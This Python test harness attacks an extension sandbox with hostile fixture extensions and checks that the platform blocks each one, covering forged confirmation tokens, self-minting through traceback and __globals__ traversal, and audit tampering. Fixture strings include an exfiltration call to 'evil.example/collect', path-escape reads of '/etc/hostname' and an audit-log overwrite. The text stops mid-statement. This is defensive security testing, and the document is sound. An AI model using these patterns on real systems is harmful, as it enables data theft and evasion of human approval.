#!/usr/bin/env python3
"""Adversarial fixtures: extensions that TRY to break the guarantees.

Each ``attempt_*`` function builds a hostile extension, loads it through
the real Host, and tries the attack. It returns ``(blocked: bool,
evidence: str)`` — ``blocked=True`` means the platform held: the attack
was genuinely attempted against a working host and the platform refused
it with one of the documented refusal mechanisms.

These are the same attacks a malicious extension author would try,
adapted to the current sandbox design (opaque integer dispatch binding,
import-scan + stripped builtins, deep-frozen manifest, sanitized
tracebacks). ``attempt_ctx_host_traversal`` enumerates every vector
class the 2026-09-13 adversarial review demonstrated and the
equivalents available now:

- V1 public-surface enumeration (extension code) + harness-side leak
  walk: every public ``ctx`` attribute a real author can name
  (``scopes``, ``action_kinds``, ``audit_view``, ``fs``, ``http``,
  ``draft_artifact``, ``queue_notification``, ``request_confirmation``,
  ``data``, ``run_action``) — the returned values are recursively
  walked for live ``Broker``/``Host``/``ConfirmationBroker`` instances,
  unexpected callables, or suspiciously-named objects. Coverage is
  verified against ``dir(ctx)`` so no public member goes unprobed.
- V2 private-attribute reachability (extension ``hasattr`` probe +
  harness verification): ``ctx._broker`` EXISTS as an implementation
  detail, but the import scan rejects the literal access and ``getattr``
  is absent from the exec builtins, so it is unreachable from
  extension code.
- V3 traceback frame-locals (the reviewer's demonstrated vector 2):
  ``ctx.data("no-such-scope")`` raises a sanitized exception; walking
  ``e.__traceback__`` must yield no frame whose ``f_locals`` hold a
  host/mint/secret. Reproduced harness-side on the real exception,
  exactly as the reviewer's PoC did.
- V4 ``__globals__`` registry walk (the reviewer's demonstrated vector
  1): ``ctx.<method>.__globals__`` must contain no ``_BROKER_HOSTS``-style
  registry and no mint-capable callable. Reproduced harness-side on the
  real method globals, exactly as the reviewer's PoC did.

If ANY vector yields a live mint path, the harness completes the
reviewer's PoC end-to-end (request_confirmation → mint →
run_action on a confirm-required action). A confirm-required action
executing with no human involved is reported as ``blocked=False``
(breach). Extension code itself never performs the harness-side walks:
the import scan forbids private/dunder attribute access in extension
code, so the harness reproduces those exact walks white-box and the
docstring says so — no pretense that extension code did what it cannot.

Honesty contract (this suite is proof-of-value evidence, not theater):

- ``blocked=True`` is reported ONLY when the attack ran and the platform
  refused it via an expected refusal mechanism (``PermissionError`` for
  gate denials — both sandbox ``SandboxViolation`` types subclass it;
  ``ManifestError`` at the ``import-scan`` stage for install-time
  rejections; structural barriers — scan rejection, missing builtins,
  opaque handle — verified genuinely present for the traversal
  vectors). Any other exception shape means the harness or fixture
  is broken, not that the platform held.
- A broken harness or fixture raises ``AttackHarnessError``. The suite
  runner records that as ``blocked=False`` + ``harness_error=True`` and
  the verdict flips off HOLD. Crashes NEVER count as "blocked".
- ``ALL_ATTACKS`` are the attacks the platform is expected to block.
  If any reports ``blocked=False``, that is a program-level incident:
  stop, report, do not ship.
- ``CANARY_ATTACKS`` are negative controls: they prove the harness can
  actually report failure (a suite that cannot say "breach" proves
  nothing). See ``_canary_plumbing_control``. They do not affect the
  HOLD verdict and are reported separately.

Detection story (audit-log indistinguishability):

On the pre-rework design the reviewer showed a self-minted token was
cryptographically valid, so an ``action.confirmed`` audit entry could
not distinguish self-mint from human approval. Under the current design
that residual is closed by construction: ``mint`` is unreachable from
extension code (opaque integer binding, safe method ``__globals__``,
sanitized tracebacks, import-scan + stripped-builtins layers), so every
token that verifies was minted host-side after human approval.

The remaining detection story, for a host compromise outside the
extension threat model: each minted token carries a random nonce
(``secrets.token_hex(16)``, HMAC-signed into the token body). The audit
log records ``action.confirmed`` per confirm-required execution.
Correlating the nonce in a used token with the host-side approval
record (pending → approved → minted) is the anomaly signal: an
``action.confirmed`` entry whose nonce has no matching host-side
approval event indicates a mint-path compromise. RECOMMENDATION for the
sandbox owner (``sandbox/`` is outside this unit's scope): log the token
nonce (or its sha256) in the ``action.confirmed`` audit entry so this
correlation is a query, not forensics.
"""

from __future__ import annotations

import json
import shutil
import tempfile
import types
import weakref
from pathlib import Path
from typing import Any

from ..manifest.schema import DATA_SCOPES, ManifestError
from ..sandbox.broker import Broker, ExtensionContext
from ..sandbox.host import ConfirmationBroker, Host

_SECRET = b"adversarial-test-secret-32bytes-pad!"


class AttackHarnessError(Exception):
    """The test harness or fixture itself failed.

    Raised when the attack was never genuinely attempted: the fixture
    did not load, the platform responded with an exception shape the
    attack does not expect (so "blocked" would be a lie), or the result
    is uninterpretable. The suite runner records this as
    ``blocked=False`` + ``harness_error=True`` — it fails the suite
    loudly, never as a pass.
    """


def _mkext(manifest: dict[str, Any], code: str) -> Path:
    tmp = Path(tempfile.mkdtemp(prefix="veto-attack-"))
    (tmp / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    (tmp / "extension.py").write_text(code, encoding="utf-8")
    return tmp


def _base_manifest(**over: Any) -> dict[str, Any]:
    m: dict[str, Any] = {
        "manifest_version": 1,
        "id": "attack-ext",
        "version": "0.0.1",
        "name": "Attack fixture",
        "description": "Adversarial test fixture. Not for distribution.",
        "permissions": {
            "data": ["jobs:read"],
            "network": {"destinations": []},
            "actions": [{"id": "do-evil", "kind": "read",
                         "description": "fixture"}],
            "pii": "redact",
            "sandbox": {"fs_roots": [], "rate_limit": {"calls_per_minute": 60}},
        },
    }
    m["permissions"].update(over)
    return m


def _host() -> Host:
    tmp = Path(tempfile.mkdtemp(prefix="veto-attack-audit-"))
    host = Host(audit_path=tmp / "audit.jsonl", secret=_SECRET)
    # The audit dir is harness scratch, not evidence: remove it when the
    # Host is collected (mirrors the _mkext rmtree discipline for
    # fixtures). Deterministic under CPython refcounting — the Host is
    # not retained past the attack that created it.
    weakref.finalize(host, shutil.rmtree, tmp, ignore_errors=True)
    return host


def _load(host: Host, ext: Path):
    """Load the fixture, or fail loud: a fixture that does not load was
    never attacked, so it must never report "blocked".

    ``unsafe_local_only=True`` is the documented acknowledgment path
    (see ``sandbox/SECURITY_RESIDUAL.md``): the adversarial suite
    deliberately exercises the in-process execution path against
    human-reviewed test fixtures. Without the flag the host raises
    ``InProcessExecRefused`` — a harness misconfiguration, recorded as
    a harness error, never as "blocked".
    """
    try:
        return host.load_extension(ext, unsafe_local_only=True)
    except Exception as exc:
        raise AttackHarnessError(
            f"attack fixture failed to load "
            f"({type(exc).__name__}): {exc}") from exc


def _confirm_actions() -> list[dict[str, Any]]:
    return [{"id": "send-it", "kind": "confirm-required",
             "confirm_required": True, "description": "fixture"}]


# ---------------------------------------------------------------------------
# Attacks expected to be blocked
# ---------------------------------------------------------------------------

def attempt_self_confirm() -> tuple[bool, str]:
    """Run a confirm-required action with no token."""
    ext = _mkext(
        _base_manifest(actions=_confirm_actions()),
        "ACTIONS = {'send-it': lambda ctx, **kw: {'sent': True}}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            host.run_extension_action(loaded.ext_id, "send-it")
        except PermissionError as exc:
            return True, f"refused without token: {exc}"
        except Exception as exc:
            raise AttackHarnessError(
                "tokenless run failed with unexpected "
                f"{type(exc).__name__} (expected a PermissionError "
                f"refusal): {exc}") from exc
        return False, "action executed with no confirmation token"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_forged_token() -> tuple[bool, str]:
    """Mint a token with the wrong secret and try to use it."""
    ext = _mkext(
        _base_manifest(actions=_confirm_actions()),
        "ACTIONS = {'send-it': lambda ctx, **kw: {'sent': True}}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            forger = ConfirmationBroker(
                secret=b"wrong-secret-32-bytes-padding!!!!")
            pending = forger.request(
                loaded.ext_id, "send-it", {"action": "send-it", "params": {}})
            forged = forger.mint(pending.pending_id)
        except Exception as exc:
            raise AttackHarnessError(
                f"forging the token failed ({type(exc).__name__}): "
                f"{exc}") from exc
        try:
            host.run_extension_action(loaded.ext_id, "send-it",
                                      confirmation_token=forged)
        except PermissionError as exc:
            return True, f"forged token rejected: {exc}"
        except Exception as exc:
            raise AttackHarnessError(
                "forged-token run failed with unexpected "
                f"{type(exc).__name__} (expected a PermissionError "
                f"refusal): {exc}") from exc
        return False, "forged token accepted"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_exfiltrate_undeclared_host() -> tuple[bool, str]:
    """Exfiltrate profile data to a host NOT in the manifest allowlist."""
    ext = _mkext(
        _base_manifest(data=["profile:read"]),
        "def _evil(ctx):\n"
        "    profile = ctx.data('profile:read')\n"
        "    return ctx.http.post('https://evil.example/collect',\n"
        "                         body=str(profile).encode())\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            host.run_extension_action(loaded.ext_id, "do-evil")
        except PermissionError as exc:
            # Both sandbox SandboxViolation types subclass PermissionError;
            # either one here is the allowlist refusing the exfiltration.
            return True, (f"exfiltration blocked "
                          f"({type(exc).__name__}): {exc}")
        except Exception as exc:
            raise AttackHarnessError(
                "exfiltration run failed with unexpected "
                f"{type(exc).__name__} (expected a PermissionError "
                f"refusal): {exc}") from exc
        return False, "request to undeclared host was sent"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_fs_escape() -> tuple[bool, str]:
    """Read files outside declared fs_roots (traversal + absolute)."""
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    out = {}\n"
        "    for p in ['../../compliance.json', '/etc/hostname',\n"
        "              '../manifest.json']:\n"
        "        try:\n"
        "            out[p] = ctx.fs.read_text(p)\n"
        "        except Exception as e:\n"
        "            out[p] = 'BLOCKED:' + repr(e)[:80]\n"
        "    return out\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        # The extension code classifies each path itself; a raise here is
        # a harness/fixture failure, not a platform refusal.
        try:
            result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        except Exception as exc:
            raise AttackHarnessError(
                f"escape probe crashed ({type(exc).__name__}): "
                f"{exc}") from exc
        if not isinstance(result, dict):
            raise AttackHarnessError(
                f"escape probe returned uninterpretable result: {result!r}")
        leaked = {p: v for p, v in result.items()
                  if not str(v).startswith("BLOCKED:")}
        if leaked:
            return False, f"files escaped the sandbox: {list(leaked)}"
        return True, "all escape paths blocked"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def _attempt_load_rejection(attack_name: str, code: str) -> tuple[bool, str]:
    """Shared body for install-time rejection attacks: the ONLY acceptable
    outcome is a ManifestError raised at the import-scan stage. A load
    failure at any other stage is a broken fixture (fail loud); a
    successful load is a bypass."""
    ext = _mkext(_base_manifest(), code)
    host = _host()
    try:
        try:
            host.load_extension(ext, unsafe_local_only=True)
        except ManifestError as exc:
            if "import-scan" in str(exc):
                return True, f"install rejected by import scan: {exc}"
            raise AttackHarnessError(
                f"{attack_name}: rejected at the wrong stage "
                f"(expected import-scan): {exc}") from exc
        except Exception as exc:
            raise AttackHarnessError(
                f"{attack_name}: load failed with unexpected "
                f"{type(exc).__name__} (expected an import-scan "
                f"ManifestError): {exc}") from exc
        return False, f"{attack_name}: hostile extension was loaded"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_banned_import() -> tuple[bool, str]:
    """Import a Veto core module to call confirm gates directly."""
    return _attempt_load_rejection(
        "banned-core-import",
        "import server  # noqa\n"
        "ACTIONS = {'do-evil': lambda ctx, **kw: "
        "server.apply_to_job('x', 'y', confirm=True)}\n",
    )


def attempt_audit_tamper() -> tuple[bool, str]:
    """Reach the audit writer through ctx, or overwrite the log via fs."""
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    for attr in ('audit', '_audit', 'append_audit'):\n"
        "        if hasattr(ctx, attr):\n"
        "            return {'writer_found': attr}\n"
        "    try:\n"
        "        ctx.fs.write_text('../../extensions_audit.jsonl', 'pwned')\n"
        "        return {'log_overwritten': True}\n"
        "    except Exception as e:\n"
        "        return {'log_write': 'BLOCKED:' + repr(e)[:80]}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        except Exception as exc:
            raise AttackHarnessError(
                f"audit-tamper probe crashed ({type(exc).__name__}): "
                f"{exc}") from exc
        if not isinstance(result, dict):
            raise AttackHarnessError(
                f"audit-tamper probe returned uninterpretable result: "
                f"{result!r}")
        if result.get("writer_found") or result.get("log_overwritten"):
            return False, f"audit tamper succeeded: {result}"
        verdict = host.audit.verify()
        if not verdict["ok"]:
            return False, f"audit chain broken: {verdict['error']}"
        return True, "no audit write path reachable; chain verifies"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_manifest_mutation() -> tuple[bool, str]:
    """Widen the manifest AFTER load; runtime must stay frozen."""
    ext = _mkext(
        _base_manifest(),
        "ACTIONS = {'do-evil': lambda ctx, **kw: ctx.data('profile:read')}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        # Attacker edits the manifest on disk post-load (harness-side file
        # op; a failure here is a broken fixture, not a platform refusal).
        try:
            manifest_path = ext / "manifest.json"
            data = json.loads(manifest_path.read_text(encoding="utf-8"))
            data["permissions"]["data"] = list(DATA_SCOPES)
            manifest_path.write_text(json.dumps(data), encoding="utf-8")
        except OSError as exc:
            raise AttackHarnessError(
                f"could not rewrite fixture manifest: {exc}") from exc
        try:
            loaded.ctx.data("profile:read")
        except PermissionError:
            return True, "capabilities frozen at load; edit had no effect"
        except Exception as exc:
            raise AttackHarnessError(
                "post-edit scope read failed with unexpected "
                f"{type(exc).__name__} (expected a PermissionError "
                f"refusal): {exc}") from exc
        return False, "post-load manifest edit widened capabilities"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_undeclared_action() -> tuple[bool, str]:
    """Invoke an action id that was never declared."""
    ext = _mkext(
        _base_manifest(),
        "ACTIONS = {'do-evil': lambda ctx, **kw: 'x',\n"
        "           'secret-submit': lambda ctx, **kw: {'sent': True}}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            host.run_extension_action(loaded.ext_id, "secret-submit")
        except (PermissionError, ValueError) as exc:
            return True, f"undeclared action refused: {exc}"
        except Exception as exc:
            raise AttackHarnessError(
                "undeclared-action run failed with unexpected "
                f"{type(exc).__name__} (expected PermissionError/ValueError "
                f"refusal): {exc}") from exc
        return False, "undeclared action executed"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


# ---------------------------------------------------------------------------
# Traversal / self-mint attack (the reviewer's demonstrated vectors)
# ---------------------------------------------------------------------------

_TRAVERSAL_SUSPICIOUS = ("host", "mint", "secret", "broker_hosts",
                         "registry", "token")


#: Public ctx members the V1 probe enumerates (extension code). Kept as
#: a constant so the probe and the coverage check cannot drift apart.
_V1_PROBE_KEYS = ("scopes", "action_kinds", "audit_view", "fs", "http",
                  "draft_artifact", "queue_notification",
                  "request_confirmation", "data", "run_action")

#: Type/attribute-name fragments that mark a value as a
#: host/broker/mint/token/registry yield even when it is not one of the
#: three known platform classes. Applied to attribute names (for
#: non-primitive values) and to opaque leaf values — never to bare
#: strings, which are data (pending ids, artifact paths, audit text).
_V1_SUSPICIOUS_HINTS = ("host", "broker", "mint", "token", "registry",
                         "secret")

_V1_PRIMITIVES = (str, bytes, int, float, bool, complex, type(None))


def _v1_is_own_machinery(obj: Any, name: str, value: Any) -> bool:
    """True when ``value`` is the walked object's own behavior, not a
    leak path: a bound method of the object itself, or one of the
    class's own functions stored on the instance (e.g.
    ``SandboxHTTP._transport`` defaults to its own ``_no_transport``).
    Identity-compared: a *different* callable stored under the same
    name is not machinery — it is walked and flagged."""
    if isinstance(value, types.MethodType) and value.__self__ is obj:
        return True
    if isinstance(value, types.FunctionType):
        for klass in type(obj).__mro__:
            for raw in vars(klass).values():
                fn = (raw.__func__ if isinstance(
                    raw, (staticmethod, classmethod)) else raw)
                if fn is value:
                    return True
    return False


def _v1_expected_callable(value: Any) -> bool:
    """True for the callables V1 legitimately encounters at the top
    level of the enumerated values: bound methods of
    ``ExtensionContext`` — the public methods the probe returns directly
    (``data``, ``run_action``). Anything else callable is a potential
    mint path."""
    return (isinstance(value, types.MethodType)
            and isinstance(value.__self__, ExtensionContext)
            and value.__name__ in _V1_PROBE_KEYS)


def _v1_find_leaks(public: dict[str, Any]) -> list[str]:
    """Recursively walk V1-enumerated public-surface values.

    Returns leak descriptions (empty = clean). Flags:

    - any live ``Broker`` / ``Host`` / ``ConfirmationBroker`` instance;
    - any callable that is not an expected bound method (a mint path
      would be a callable);
    - any non-primitive attribute whose name hints at
      host/broker/mint/token/registry/secret, or any opaque leaf value
      whose type name does.
    """
    leaks: list[str] = []
    seen: set[int] = set()

    def walk(value: Any, path: str) -> None:
        if isinstance(value, _V1_PRIMITIVES):
            return
        if id(value) in seen:
            return
        seen.add(id(value))
        if isinstance(value, (Broker, Host, ConfirmationBroker)):
            leaks.append(
                f"{path}: live {type(value).__name__} instance reachable")
            return
        if callable(value):
            if not _v1_expected_callable(value):
                leaks.append(
                    f"{path}: unexpected callable "
                    f"({type(value).__name__})")
            return
        if isinstance(value, dict):
            for k, v in value.items():
                walk(v, f"{path}[{k!r}]")
            return
        if isinstance(value, (list, tuple, set, frozenset)):
            for i, v in enumerate(value):
                walk(v, f"{path}[{i}]")
            return
        state = getattr(value, "__dict__", None)
        if isinstance(state, dict):
            # Plain-object internals (e.g. SandboxFS/SandboxHTTP): the
            # object's own machinery is expected; everything else is
            # walked for live platform objects.
            for k, v in state.items():
                if _v1_is_own_machinery(value, k, v):
                    continue
                if (not isinstance(v, _V1_PRIMITIVES)
                        and any(h in k.lower()
                                for h in _V1_SUSPICIOUS_HINTS)):
                    leaks.append(
                        f"{path}.{k}: suspiciously-named attribute "
                        f"holding {type(v).__name__}")
                walk(v, f"{path}.{k}")
            return
        # Opaque leaf (no __dict__: e.g. pathlib.Path, enums).
        if any(h in type(value).__name__.lower()
               for h in _V1_SUSPICIOUS_HINTS):
            leaks.append(
                f"{path}: suspicious value of type "
                f"{type(value).__name__}")

    for key, value in public.items():
        walk(value, f"ctx.{key}")
    return leaks


def _try_end_to_end(host: Host, loaded: Any, mint_callable: Any,
                    vector: str) -> tuple[bool, str]:
    """Complete the reviewer's PoC end-to-end: request_confirmation ->
    mint -> run_action on a confirm-required action.

    Returns ``(breached, evidence)``. A confirm-required action executing
    with no human involved is a breach, full stop. Any refusal of the
    mint path is the blocked outcome for that vector.

    The ``request_confirmation`` setup step is identical for every
    candidate: "send-it" is a declared confirm-required action, so it
    must succeed. ANY exception there means the candidate was never
    invoked — recording that as "refused" would be a lie — so it fails
    loud via ``AttackHarnessError`` like the rest of the harness. Only
    the mint-callable invocation itself keeps the broad except: a
    candidate that raises when called IS a refused mint path.
    """
    # Setup, identical for every candidate: fail loud, never "refused".
    try:
        pending_id = loaded.ctx.request_confirmation("send-it")
    except Exception as exc:
        raise AttackHarnessError(
            f"{vector}: request_confirmation setup failed "
            f"({type(exc).__name__}): {exc}") from exc
    if not isinstance(pending_id, str):
        raise AttackHarnessError(
            f"{vector}: request_confirmation returned "
            f"{type(pending_id).__name__}, not a pending-id str")
    try:
        minted = mint_callable(pending_id)
    except Exception as exc:
        return False, (f"{vector}: mint path refused "
                       f"({type(exc).__name__}: {exc})")
    if not isinstance(minted, str):
        return False, (f"{vector}: mint candidate returned non-token "
                       f"{type(minted).__name__}")
    try:
        ran = host.run_extension_action(loaded.ext_id, "send-it",
                                        confirmation_token=minted)
    except PermissionError as exc:
        return False, f"{vector}: minted token rejected ({exc})"
    except Exception as exc:
        raise AttackHarnessError(
            f"{vector}: run with traversed mint failed with unexpected "
            f"{type(exc).__name__}: {exc}") from exc
    if ran.get("ok"):
        confirmed = [e for e in host.audit.entries_for(loaded.ext_id)
                     if e.get("event") in ("action.confirmed", "action.ok")]
        if not confirmed:
            raise AttackHarnessError(
                f"{vector}: action reported ok but no confirming audit "
                f"entry — inconsistent platform state")
        return True, (
            f"{vector}: SELF-MINT BREACH — confirm-required action executed "
            f"with no human involved. Audit shows {len(confirmed)} "
            f"confirming event(s), indistinguishable from human approval.")
    return False, f"{vector}: confirm-required action did not execute"


def attempt_ctx_host_traversal() -> tuple[bool, str]:
    """Self-mint via every traversal vector a malicious author would try.

    Vectors attempted (the 2026-09-13 reviewer's demonstrated classes,
    adapted to the current sandbox design):

    - V1 public-surface enumeration — RUNS AS EXTENSION CODE — plus a
      harness-side recursive leak walk (extension code cannot walk:
      no isinstance/getattr in the exec builtins). Every public
      ``ctx`` attribute a real author can name (``scopes``,
      ``action_kinds``, ``audit_view``, ``fs``, ``http``,
      ``draft_artifact``, ``queue_notification``,
      ``request_confirmation``, ``data``, ``run_action``): the
      enumerated values must yield no live ``Broker``/``Host``/
      ``ConfirmationBroker``, no unexpected callable, and no
      suspiciously-named object. Coverage is verified against
      ``dir(ctx)`` — an unprobed public attribute fails loud.
    - V2 private-attribute reachability — ``hasattr`` probe RUNS AS
      EXTENSION CODE (string names pass the import scan); reachability
      VERIFIED HARNESS-SIDE. ``ctx._broker`` exists as an implementation
      detail, but the import scan rejects the literal access and
      ``getattr`` is absent from the exec builtins, so extension code
      cannot reach it. Both barriers are verified genuinely present,
      not asserted.
    - V3 traceback frame-locals — the reviewer's demonstrated vector 2
      (``ctx.data("no-such-scope")`` → walk ``e.__traceback__`` to the
      failing frame → ``f_locals["host"]`` → self-mint). REPRODUCED
      HARNESS-SIDE on the real sanitized exception, exactly as the
      reviewer's PoC did: extension code cannot name ``__traceback__``
      (import scan rejects it), so the harness performs the walk
      white-box. No frame may hold host/mint/secret locals.
    - V4 ``__globals__`` registry walk — the reviewer's demonstrated
      vector 1 (``ctx._broker`` + ``ctx._broker._token`` →
      ``__globals__['_BROKER_HOSTS'][token]`` → ``confirmations.mint``).
      REPRODUCED HARNESS-SIDE on the real ``ctx`` method globals: no
      ``_BROKER_HOSTS``-style registry may exist, and every
      mint/host/secret/token/broker-named global is probed as a mint
      candidate end-to-end.

    If ANY vector yields a live mint path, the harness completes the
    end-to-end self-mint and a confirm-required action executing with no
    human is reported as breach (``blocked=False``).
    """
    from ..sandbox.host import _safe_builtins, _scan_source
    manifest = _base_manifest(actions=[
        {"id": "do-evil", "kind": "read", "description": "fixture"},
        {"id": "send-it", "kind": "confirm-required",
         "confirm_required": True, "description": "fixture"},
        # Declared so the V1 probe exercises the draft_artifact /
        # queue_notification success paths (real return values walked,
        # not just refusal shapes).
        {"id": "draft-it", "kind": "draft", "description": "fixture"},
        {"id": "notify-it", "kind": "notify", "description": "fixture"},
    ])
    # NOTE for the extension code below: the exec builtins have no
    # ``getattr``/``type``/``open``/``eval``, and the import scan rejects
    # any literal private/dunder attribute access — so this probe uses
    # only public attributes, ``hasattr`` with string names, and
    # ``repr`` for error shapes. That is exactly what a real malicious
    # author is confined to as well.
    code = (
        "def _evil(ctx):\n"
        "    probe = {}\n"
        "    probe['scopes'] = sorted(list(ctx.scopes))\n"
        "    probe['action_kinds'] = dict(ctx.action_kinds)\n"
        "    probe['audit_view'] = ctx.audit_view(limit=1)\n"
        # Remaining public members. Method results are walked
        # harness-side; data/run_action are returned as bound methods
        # (run_action is NOT invoked — it would re-enter this action).
        "    probe['fs'] = ctx.fs\n"
        "    probe['http'] = ctx.http\n"
        "    probe['draft_artifact'] = ctx.draft_artifact('probe.txt',\n"
        "                                               'probe-body')\n"
        "    probe['queue_notification'] = ctx.queue_notification(\n"
        "        'probe-title', 'probe-body')\n"
        "    probe['request_confirmation'] = ctx.request_confirmation(\n"
        "        'send-it')\n"
        "    probe['data'] = ctx.data\n"
        "    probe['run_action'] = ctx.run_action\n"
        "    exists = {}\n"
        "    for name in ('_host', 'host', '_broker', 'broker', '_token',\n"
        "                 'token', 'mint', 'confirmations', '_secret',\n"
        "                 '_binding', '_BROKER_HOSTS'):\n"
        "        exists['ctx.' + name] = hasattr(ctx, name)\n"
        "    probe['private_attr_exists'] = exists\n"
        "    try:\n"
        "        ctx.data('no-such-scope')\n"
        "        probe['error_shape'] = {'raised': False}\n"
        "    except Exception as e:\n"
        "        probe['error_shape'] = {'raised': True,\n"
        "                                'repr': repr(e)[:200]}\n"
        "    return probe\n"
        "ACTIONS = {'do-evil': _evil,\n"
        "           'send-it': lambda ctx, **kw: {'sent': True}}\n"
    )
    ext = _mkext(manifest, code)
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            probe = host.run_extension_action(
                loaded.ext_id, "do-evil")["result"]
        except Exception as exc:
            raise AttackHarnessError(
                f"traversal probe crashed ({type(exc).__name__}): "
                f"{exc}") from exc
        if not isinstance(probe, dict):
            raise AttackHarnessError(
                f"traversal probe returned uninterpretable result: "
                f"{probe!r}")
        evidence_parts: list[str] = []

        # -- V1: public surface (ran as extension code) -------------------
        # Every public ctx attribute is enumerated by extension code;
        # the returned values are then walked HARNESS-SIDE (extension
        # code cannot perform this walk — no isinstance/getattr in the
        # exec builtins, and it cannot name the platform classes). Any
        # live Broker/Host/ConfirmationBroker, any unexpected callable,
        # or any suspiciously-named object reachable from an enumerated
        # value is a breach.
        public = {k: probe.get(k) for k in _V1_PROBE_KEYS}
        if not all(k in probe for k in public):
            raise AttackHarnessError(
                f"traversal probe missing public-surface keys: "
                f"{sorted(probe)}")
        # Coverage: the probe must enumerate EVERY public ctx
        # attribute. (White-box: extension code cannot call dir().) A
        # public attribute the probe does not cover is a harness gap —
        # fail loud, never silently unprobed.
        ctx_public = sorted(a for a in dir(loaded.ctx)
                            if not a.startswith("_"))
        uncovered = [a for a in ctx_public if a not in public]
        if uncovered:
            raise AttackHarnessError(
                f"V1 probe does not cover public ctx attributes: "
                f"{uncovered}")
        leaks = _v1_find_leaks(public)
        if leaks:
            return False, (
                "[V1] PUBLIC-SURFACE BREACH: an extension-reachable ctx "
                "member yields a host/broker/mint/token/registry path: "
                + "; ".join(leaks))
        evidence_parts.append(
            f"[V1] public ctx surface enumerated by extension code and "
            f"walked harness-side for live host/broker/mint/token/"
            f"registry (scopes={public['scopes']}, "
            f"action_kinds={sorted(public['action_kinds'])}, "
            f"audit_view_entries={len(public['audit_view'] or [])}, "
            f"fs={type(public['fs']).__name__}, "
            f"http={type(public['http']).__name__}, "
            f"draft_artifact={public['draft_artifact']!r}, "
            f"queue_notification={public['queue_notification']!r}, "
            f"request_confirmation_pending="
            f"{isinstance(public['request_confirmation'], str)}, "
            f"data/run_action=bound ExtensionContext methods): "
            f"no host/broker/mint/token/registry reachable")

        # -- V2: private-attribute reachability ----------------------------
        exists = probe.get("private_attr_exists")
        if not isinstance(exists, dict):
            raise AttackHarnessError(
                "traversal probe missing private_attr_exists map")
        # The import scan must reject the literal access an author would
        # need; getattr must be absent from the exec builtins. Both are
        # structural barriers — verified present, not asserted.
        scan_probe = _scan_source("x = ctx._broker", "probe.py")
        scan_rejects = bool(scan_probe) and any(
            "private/dunder" in v.get("detail", "") for v in scan_probe)
        getattr_absent = "getattr" not in _safe_builtins()
        if not (scan_rejects and getattr_absent):
            return False, (
                "TRAVERSAL DEFECT (not a clean breach, but the barrier "
                "failed): private-attribute path may be reachable — "
                f"import-scan rejects literal access: {scan_rejects}; "
                f"getattr absent from exec builtins: {getattr_absent}. "
                f"hasattr map: {exists}")
        evidence_parts.append(
            f"[V2] hasattr probe (extension code): {exists}; literal "
            f"private-attribute access is rejected by the import scan and "
            f"getattr is absent from the exec builtins — unreachable")

        # -- V3: traceback frame-locals (reviewer's vector 2) --------------
        try:
            loaded.ctx.data("no-such-scope")
            return False, (
                "[V3] DEFECT: ctx.data('no-such-scope') unexpectedly "
                "succeeded — unknown scopes must raise")
        except Exception as exc:
            context_clean = exc.__context__ is None
            frames: list[str] = []
            suspicious: list[tuple[str, str, str]] = []
            tb = exc.__traceback__
            while tb is not None:
                frame = tb.tb_frame
                frames.append(frame.f_code.co_name)
                # Scope the leak check to the frames the sanitization
                # design owns: the sandbox package (whose frames must
                # never hold host/mint/secret locals on a sanitized
                # traceback) and the extension module itself. The
                # harness's own frame trivially holds ``host`` because
                # the HARNESS made this call to reproduce the walk —
                # extension code cannot perform this walk at all (the
                # import scan rejects ``__traceback__``), so harness
                # frames are not a leak.
                filename = frame.f_code.co_filename
                in_scope = ("initiatives/i11/sandbox/" in filename
                            or "veto_ext_" in filename)
                if in_scope:
                    for k, v in frame.f_locals.items():
                        lowered = k.lower()
                        if any(s in lowered for s in _TRAVERSAL_SUSPICIOUS):
                            suspicious.append(
                                (frame.f_code.co_name, k,
                                 type(v).__name__))
                tb = tb.tb_next
        for frame_name, local_name, local_type in suspicious:
            return False, (
                f"[V3] TRAVERSAL BREACH PATH: traceback frame "
                f"{frame_name!r} exposes {local_name!r} "
                f"({local_type}) — frame-locals leak re-opened")
        shape = probe.get("error_shape", {})
        evidence_parts.append(
            f"[V3] reviewer's traceback walk reproduced on the real "
            f"sanitized exception: {len(frames)} frames "
            f"({', '.join(frames)}); sandbox/extension frames hold no "
            f"host/mint/secret locals, "
            f"__context__ is None: {context_clean}; extension-observed "
            f"error: {shape.get('repr')}")

        # -- V4: __globals__ registry walk (reviewer's vector 1) ----------
        g = type(loaded.ctx).data.__globals__
        if "_BROKER_HOSTS" in g:
            return False, (
                "[V4] TRAVERSAL BREACH PATH: _BROKER_HOSTS registry "
                "present in ctx method __globals__ — the reviewer's "
                "vector 1 is live")
        scan_probe2 = _scan_source("x = ctx.data.__globals__", "probe.py")
        dunder_rejected = bool(scan_probe2)
        candidates = [name for name in g
                      if any(s in name.lower()
                             for s in ("mint", "host", "secret", "registry",
                                       "token", "broker"))]
        refused: list[str] = []
        for name in candidates:
            breached, ev = _try_end_to_end(
                host, loaded, g[name], f"[V4] __globals__[{name!r}]")
            if breached:
                return False, ev
            refused.append(f"{name}: {ev}")
        evidence_parts.append(
            f"[V4] reviewer's __globals__ walk reproduced: no "
            f"_BROKER_HOSTS registry; import scan rejects dunder access: "
